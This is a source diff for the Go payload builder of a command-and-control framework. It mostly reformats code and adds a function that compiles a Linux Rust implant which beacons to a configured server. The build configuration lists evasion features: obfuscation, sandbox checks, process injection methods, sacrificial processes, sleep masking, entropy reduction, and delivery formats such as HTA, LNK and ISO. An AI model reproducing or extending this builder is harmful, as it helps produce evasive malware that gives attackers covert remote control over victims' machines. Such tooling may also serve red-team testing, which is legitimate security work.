@@ -18,16 +18,16 @@ import (
 )
 
 type BuildConfig struct {
-	ServerURL    string `json:"server_url"`
-	Transport    string `json:"transport"`
+	ServerURL string `json:"server_url"`
+	Transport string `json:"transport"`
 	// ParentID links a payload spawned by an existing agent back to that agent.
 	// It is embedded at build time because a fresh process cannot inherit the
 	// parent's runtime agent ID.
-	ParentID     string `json:"parent_id,omitempty"`
+	ParentID string `json:"parent_id,omitempty"`
 	// ParentIP identifies the parent C2/pipe endpoint for reusable pivot
 	// artifacts. It is metadata only; the binary still receives the configured
 	// transport values below.
-	ParentIP     string `json:"parent_ip,omitempty"`
+	ParentIP string `json:"parent_ip,omitempty"`
 	// OPSEC marks builds that use one or more advanced OPSEC options. It is
 	// persisted with the artifact so the UI can label it without guessing from
 	// the filename.
@@ -38,16 +38,16 @@ type BuildConfig struct {
 	AgentKeyPEM  string `json:"agent_key_pem,omitempty"`
 	CACertPEM    string `json:"ca_cert_pem,omitempty"`
 	// Build options
-	Lang          string `json:"lang"`           // "go"(default) | "nim"
-	Arch          string `json:"arch"`           // "amd64"(default) | "386" | "arm64"
-	GOOS          string `json:"goos"`           // "windows"(default) | "linux"
-	Garble        bool   `json:"garble"`
-	KillDate      string `json:"kill_date"`      // "2026-01-15" or ""
-	SandboxChecks bool   `json:"sandbox_checks"`
+	Lang            string `json:"lang"` // "go"(default) | "nim"
+	Arch            string `json:"arch"` // "amd64"(default) | "386" | "arm64"
+	GOOS            string `json:"goos"` // "windows"(default) | "linux"
+	Garble          bool   `json:"garble"`
+	KillDate        string `json:"kill_date"` // "2026-01-15" or ""
+	SandboxChecks   bool   `json:"sandbox_checks"`
 	InjectMethod    string `json:"inject_method"`    // ""|"fiber"|"callback"|"ntthread"
 	SacrificialProc string `json:"sacrificial_proc"` // e.g. C:\Windows\System32\dllhost.exe
-	Encrypt       string `json:"encrypt"`        // ""|"xor"|"aes"
-	Format        string `json:"format"`         // "exe"|"dll"|"linux"|"html"|"lnk"|"iso"|"hta"
+	Encrypt         string `json:"encrypt"`          // ""|"xor"|"aes"
+	Format          string `json:"format"`           // "exe"|"dll"|"linux"|"html"|"lnk"|"iso"|"hta"
 	// Malleable profile
 	UserAgent   string `json:"user_agent"`
 	BeaconURIs  string `json:"beacon_uris"`
@@ -249,12 +249,11 @@ func BuildEXEStream(cfg BuildConfig, outDir string, progress io.Writer) (string,
 	return outPath, nil
 }
 
-
 // BuildNimEXE cross-compiles the Nim agent for Windows x64.
 // Requires nim >= 2.0 (install via choosenim) and x86_64-w64-mingw32-gcc.
 func BuildNimEXE(cfg BuildConfig, outDir string) (string, error) {
-	root   := projectRoot()
-	outDir  = absDir(root, outDir)
+	root := projectRoot()
+	outDir = absDir(root, outDir)
 	if err := os.MkdirAll(outDir, 0755); err != nil {
 		return "", fmt.Errorf("mkdir: %w", err)
 	}
@@ -269,30 +268,34 @@ func BuildNimEXE(cfg BuildConfig, outDir string) (string, error) {
 		return "", err
 	}
 
-	isDLL    := cfg.Format == "dll"
+	isDLL := cfg.Format == "dll"
 	entryFile := "agent.nim"
-	appMode  := "gui"
-	ext      := "exe"
+	appMode := "gui"
+	ext := "exe"
 	if isDLL {
 		entryFile = "agent_dll.nim"
-		appMode   = "lib"
-		ext       = "dll"
+		appMode = "lib"
+		ext = "dll"
 	}
 
 	arch := normalizeArch(cfg.Arch) // "amd64" or "386"
 	nimCPU := "amd64"
-	nimCC  := "x86_64-w64-mingw32-gcc"
+	nimCC := "x86_64-w64-mingw32-gcc"
 	if arch == "386" {
 		nimCPU = "i386"
-		nimCC  = "i686-w64-mingw32-gcc"
+		nimCC = "i686-w64-mingw32-gcc"
 	}
 
-	outName  := agentName(cfg, "."+ext)
-	outPath  := filepath.Join(outDir, outName)
+	outName := agentName(cfg, "."+ext)
+	outPath := filepath.Join(outDir, outName)
 	sleepSec := cfg.SleepSec
-	if sleepSec <= 0 { sleepSec = 5 }
-	jitter   := cfg.JitterPct
-	if jitter < 0 { jitter = 20 }
+	if sleepSec <= 0 {
+		sleepSec = 5
+	}
+	jitter := cfg.JitterPct
+	if jitter < 0 {
+		jitter = 20
+	}
 
 	args := []string{
 		"compile",
@@ -379,7 +382,6 @@ func findNim() (string, error) {
 	}
 	return "", fmt.Errorf("nim not found; install via: curl https://nim-lang.org/choosenim/init.sh -sSf | sh")
 }
-
 
 func copyFile(src, dst string) error {
 	data, err := os.ReadFile(src)
@@ -483,8 +485,8 @@ func BuildRustEXE(cfg BuildConfig, outDir string) (string, error) {
 		return "", fmt.Errorf("mingw not found (%s): apt install gcc-mingw-w64-x86-64", cc)
 	}
 
-	root   := projectRoot()
-	outDir  = absDir(root, outDir)
+	root := projectRoot()
+	outDir = absDir(root, outDir)
 	if err := os.MkdirAll(outDir, 0755); err != nil {
 		return "", fmt.Errorf("mkdir: %w", err)
 	}
@@ -495,15 +497,21 @@ func BuildRustEXE(cfg BuildConfig, outDir string) (string, error) {
 	}
 
 	sleepSec := cfg.SleepSec
-	if sleepSec <= 0 { sleepSec = 5 }
+	if sleepSec <= 0 {
+		sleepSec = 5
+	}
 	jitter := cfg.JitterPct
-	if jitter < 0 { jitter = 20 }
+	if jitter < 0 {
+		jitter = 20
+	}
 
 	outName := agentName(cfg, ".exe")
 	outPath := filepath.Join(outDir, outName)
 
 	rustDNSServer := cfg.DNSServer
-	if rustDNSServer == "" { rustDNSServer = "8.8.8.8" }
+	if rustDNSServer == "" {
+		rustDNSServer = "8.8.8.8"
+	}
 
 	rustEnv := append(os.Environ(),
 		"AGENT_SERVER_URL="+cfg.ServerURL,
@@ -538,8 +546,8 @@ func BuildRustEXE(cfg BuildConfig, outDir string) (string, error) {
 
 	buildDir := filepath.Join(agentDir, "target", "x86_64-pc-windows-gnu", "release")
 	cmd := exec.Command(cargo, "build", "--release", "--target", "x86_64-pc-windows-gnu")
-	cmd.Dir  = agentDir
-	cmd.Env  = rustEnv
+	cmd.Dir = agentDir
+	cmd.Env = rustEnv
 	if out, err := cmd.CombinedOutput(); err != nil {
 		return "", fmt.Errorf("rust build failed: %v\n%s", err, out)
 	}
@@ -553,6 +561,84 @@ func BuildRustEXE(cfg BuildConfig, outDir string) (string, error) {
 	src := filepath.Join(buildDir, srcName)
 	if err := copyFile(src, outPath); err != nil {
 		return "", fmt.Errorf("copy rust binary: %w", err)
+	}
+	if cfg.EntropyReduce {
+		_ = reduceEntropy(outPath)
+	}
+	return outPath, nil
+}
+
+// BuildRustELF builds the Rust agent natively for Linux x64.
+// The Linux implementation supports plain HTTP, TCP, DNS and DoH. HTTPS and
+// mTLS are rejected here because the Linux client has no TLS implementation.
+func BuildRustELF(cfg BuildConfig, outDir string) (string, error) {
+	if cfg.Transport == "https" || cfg.Transport == "mtls" {
+		return "", fmt.Errorf("rust linux does not support transport %q", cfg.Transport)
+	}
+
+	cargo, err := findCargo()
+	if err != nil {
+		return "", err
+	}
+	root := projectRoot()
+	outDir = absDir(root, outDir)
+	if err := os.MkdirAll(outDir, 0755); err != nil {
+		return "", fmt.Errorf("mkdir: %w", err)
+	}
+	agentDir := filepath.Join(root, "agents", "agent-rust")
+	if _, err := os.Stat(filepath.Join(agentDir, "Cargo.toml")); err != nil {
+		return "", fmt.Errorf("agent-rust not found in %s", agentDir)
+	}
+
+	sleepSec := cfg.SleepSec
+	if sleepSec <= 0 {
+		sleepSec = 5
+	}
+	jitter := cfg.JitterPct
+	if jitter < 0 {
+		jitter = 20
+	}
+	transport := cfg.Transport
+	if transport == "" {
+		transport = "http"
+	}
+	serverURL := cfg.ServerURL
+	if serverURL == "" {
+		serverURL = "http://127.0.0.1:8080"
+	}
+	dnsServer := cfg.DNSServer
+	if dnsServer == "" {
+		dnsServer = "8.8.8.8"
+	}
+	outPath := filepath.Join(outDir, agentName(cfg, "_linux"))
+
+	rustEnv := append(os.Environ(),
+		"AGENT_SERVER_URL="+serverURL,
+		"AGENT_TRANSPORT="+transport,
+		fmt.Sprintf("AGENT_SLEEP_SEC=%d", sleepSec),
+		fmt.Sprintf("AGENT_JITTER_PCT=%d", jitter),
+		"AGENT_KILL_DATE="+cfg.KillDate,
+		"AGENT_SMB_PIPE="+cfg.SMBPipe,
+		"AGENT_BEACON_URIS="+cfg.BeaconURIs,
+		"AGENT_WORKING_HOURS="+cfg.WorkingHours,
+		"AGENT_CANARY_DOMAIN="+cfg.CanaryDomain,
+		"AGENT_DNS_SERVER="+dnsServer,
+		"AGENT_DNS_DOMAIN="+cfg.DNSDomain,
+		"AGENT_PARENT_ID="+cfg.ParentID,
+		"AGENT_PRESET_ID="+cfg.PresetID,
+	)
+	if cfg.UserAgent != "" {
+		rustEnv = append(rustEnv, "AGENT_USER_AGENT="+cfg.UserAgent)
+	}
+
+	cmd := exec.Command(cargo, "build", "--release", "--bin", "agent-rust")
+	cmd.Dir = agentDir
+	cmd.Env = rustEnv
+	if out, err := cmd.CombinedOutput(); err != nil {
+		return "", fmt.Errorf("rust linux build failed: %v\n%s", err, out)
+	}
+	if err := copyFile(filepath.Join(agentDir, "target", "release", "agent-rust"), outPath); err != nil {
+		return "", fmt.Errorf("copy rust linux binary: %w", err)
 	}
 	if cfg.EntropyReduce {
 		_ = reduceEntropy(outPath)
@@ -582,8 +668,8 @@ func BuildCAgentEXE(cfg BuildConfig, outDir string) (string, error) {
 		return "", fmt.Errorf("mingw not found (%s): apt install gcc-mingw-w64-x86-64", cc)
 	}
 
-	root   := projectRoot()
-	outDir  = absDir(root, outDir)
+	root := projectRoot()
+	outDir = absDir(root, outDir)
 	if err := os.MkdirAll(outDir, 0755); err != nil {
 		return "", fmt.Errorf("mkdir: %w", err)
 	}
@@ -604,9 +690,13 @@ func BuildCAgentEXE(cfg BuildConfig, outDir string) (string, error) {
 	}
 
 	sleepSec := cfg.SleepSec
-	if sleepSec <= 0 { sleepSec = 5 }
+	if sleepSec <= 0 {
+		sleepSec = 5
+	}
 	jitter := cfg.JitterPct
-	if jitter < 0 { jitter = 20 }
+	if jitter < 0 {
+		jitter = 20
+	}
 
 	outName := agentName(cfg, ".exe")
 	outPath := filepath.Join(outDir, outName)
@@ -674,10 +764,14 @@ func BuildCAgentEXE(cfg BuildConfig, outDir string) (string, error) {
 	{
 		sleepMaskNum := 0
 		switch cfg.SleepMaskMode {
-		case "xor":      sleepMaskNum = 1
-		case "noaccess": sleepMaskNum = 2
-		case "ekko":     sleepMaskNum = 3
-		case "foliage":  sleepMaskNum = 4
+		case "xor":
+			sleepMaskNum = 1
+		case "noaccess":
+			sleepMaskNum = 2
+		case "ekko":
+			sleepMaskNum = 3
+		case "foliage":
+			sleepMaskNum = 4
 		}
 		args = append(args, fmt.Sprintf("-DAGENT_SLEEP_MASK_MODE=%d", sleepMaskNum))
 	}
@@ -717,23 +811,29 @@ func BuildCAgentDLL(cfg BuildConfig, outDir string) (string, error) {
 		return "", fmt.Errorf("mingw not found (%s): apt install gcc-mingw-w64-x86-64", cc)
 	}
 
-	root    := projectRoot()
-	outDir   = absDir(root, outDir)
+	root := projectRoot()
+	outDir = absDir(root, outDir)
 	agentDir := filepath.Join(root, "agents", "agent-c")
 	os.MkdirAll(outDir, 0755)
 
 	outPath := filepath.Join(outDir, agentName(cfg, ".dll"))
 
 	sleepSec := cfg.SleepSec
-	if sleepSec <= 0 { sleepSec = 5 }
+	if sleepSec <= 0 {
+		sleepSec = 5
+	}
 	jitter := cfg.JitterPct
-	if jitter < 0 { jitter = 20 }
+	if jitter < 0 {
+		jitter = 20
+	}
 	ua := cfg.UserAgent
 	if ua == "" {
 		ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
 	}
 	dnsServer := cfg.DNSServer
-	if dnsServer == "" { dnsServer = "8.8.8.8" }
+	if dnsServer == "" {
+		dnsServer = "8.8.8.8"
+	}
 
 	// DLL sources: replace agent.c with agent_dll.c
 	sources := []string{
@@ -787,10 +887,14 @@ func BuildCAgentDLL(cfg BuildConfig, outDir string) (string, error) {
 	{
 		sleepMaskNum := 0
 		switch cfg.SleepMaskMode {
-		case "xor":      sleepMaskNum = 1
-		case "noaccess": sleepMaskNum = 2
-		case "ekko":     sleepMaskNum = 3
-		case "foliage":  sleepMaskNum = 4
+		case "xor":
+			sleepMaskNum = 1
+		case "noaccess":
+			sleepMaskNum = 2
+		case "ekko":
+			sleepMaskNum = 3
+		case "foliage":
+			sleepMaskNum = 4
 		}
 		args = append(args, fmt.Sprintf("-DAGENT_SLEEP_MASK_MODE=%d", sleepMaskNum))
 	}
@@ -1402,8 +1506,8 @@ func pemToPFXBase64(certPEM, keyPEM string) (string, error) {
 	}
 	defer os.RemoveAll(dir)
 	certFile := filepath.Join(dir, "cert.pem")
-	keyFile  := filepath.Join(dir, "key.pem")
-	pfxFile  := filepath.Join(dir, "agent.pfx")
+	keyFile := filepath.Join(dir, "key.pem")
+	pfxFile := filepath.Join(dir, "agent.pfx")
 	if err := os.WriteFile(certFile, []byte(certPEM), 0600); err != nil {
 		return "", err
 	}
@@ -1443,7 +1547,7 @@ func mtlsToHTTPSURL(serverURL string) string {
 // If the transport is "mtls" the server URL is rewritten to the plain HTTPS port (443)
 // because the Linux transport does not implement mTLS client certificates.
 func BuildCAgentLinux(cfg BuildConfig, outDir string) (string, error) {
-	root  := projectRoot()
+	root := projectRoot()
 	outDir = absDir(root, outDir)
 	if err := os.MkdirAll(outDir, 0755); err != nil {
 		return "", fmt.Errorf("mkdir: %w", err)
@@ -1456,9 +1560,13 @@ func BuildCAgentLinux(cfg BuildConfig, outDir string) (string, error) {
 	}
 
 	sleepSec := cfg.SleepSec
-	if sleepSec <= 0 { sleepSec = 5 }
+	if sleepSec <= 0 {
+		sleepSec = 5
+	}
 	jitter := cfg.JitterPct
-	if jitter < 0 { jitter = 20 }
+	if jitter < 0 {
+		jitter = 20
+	}
 
 	serverURL := cfg.ServerURL
 	if cfg.Transport == "mtls" {
@@ -1481,13 +1589,17 @@ func BuildCAgentLinux(cfg BuildConfig, outDir string) (string, error) {
 		fmt.Sprintf("AGENT_USER_AGENT=%s", ua),
 		fmt.Sprintf("AGENT_KILL_DATE=%s", cfg.KillDate),
 		fmt.Sprintf("AGENT_SMB_PIPE=%s", func() string {
-			if cfg.SMBPipe != "" { return cfg.SMBPipe }
+			if cfg.SMBPipe != "" {
+				return cfg.SMBPipe
+			}
 			return "endgamepipe"
 		}()),
 		fmt.Sprintf("AGENT_BEACON_URIS=%s", cfg.BeaconURIs),
 		fmt.Sprintf("AGENT_CANARY_DOMAIN=%s", cfg.CanaryDomain),
 		fmt.Sprintf("AGENT_DNS_SERVER=%s", func() string {
-			if cfg.DNSServer != "" { return cfg.DNSServer }
+			if cfg.DNSServer != "" {
+				return cfg.DNSServer
+			}
 			return "8.8.8.8"
 		}()),
 		fmt.Sprintf("AGENT_DNS_DOMAIN=%s", cfg.DNSDomain),
@@ -1510,7 +1622,10 @@ func BuildCAgentLinux(cfg BuildConfig, outDir string) (string, error) {
 // Runs nim natively on the build host (no cross-compilation needed when building on Linux).
 // If the transport is "mtls" the URL is rewritten to port 443 (plain HTTPS).
 func BuildNimELF(cfg BuildConfig, outDir string) (string, error) {
-	root  := projectRoot()
+	if cfg.Transport != "" && cfg.Transport != "http" {
+		return "", fmt.Errorf("Nim Linux supports only the http transport")
+	}
+	root := projectRoot()
 	outDir = absDir(root, outDir)
 	if err := os.MkdirAll(outDir, 0755); err != nil {
 		return "", fmt.Errorf("mkdir: %w", err)
@@ -1527,9 +1642,13 @@ func BuildNimELF(cfg BuildConfig, outDir string) (string, error) {
 	}
 
 	sleepSec := cfg.SleepSec
-	if sleepSec <= 0 { sleepSec = 5 }
+	if sleepSec <= 0 {
+		sleepSec = 5
+	}
 	jitter := cfg.JitterPct
-	if jitter < 0 { jitter = 20 }
+	if jitter < 0 {
+		jitter = 20
+	}
 
 	serverURL := cfg.ServerURL
 	if cfg.Transport == "mtls" {
@@ -1606,7 +1725,9 @@ func buildLDFlags(cfg BuildConfig) string {
 		add("ParentAgentID", cfg.ParentID)
 	}
 	sleepSecGo := cfg.SleepSec
-	if sleepSecGo <= 0 { sleepSecGo = 5 }
+	if sleepSecGo <= 0 {
+		sleepSecGo = 5
+	}
 	add("SleepSec", fmt.Sprintf("%d", sleepSecGo))
 	add("JitterPct", fmt.Sprintf("%d", cfg.JitterPct))
 
